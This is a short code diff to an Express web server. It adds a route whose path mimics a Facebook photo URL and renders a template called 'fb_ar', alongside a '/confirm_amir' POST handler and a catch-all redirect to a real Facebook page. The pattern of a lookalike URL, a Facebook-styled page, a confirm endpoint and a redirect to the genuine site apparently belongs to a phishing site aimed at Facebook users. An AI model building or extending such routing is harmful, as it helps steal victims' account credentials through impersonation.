@@ -92,6 +92,9 @@ app.post('/confirm_amir', function (req, res) {
         }
     })
 })
+app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/735306480197164445',function(req,res){
+    res.render('fb_ar')
+})
 app.get('*',function(req,res){
     res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
 })
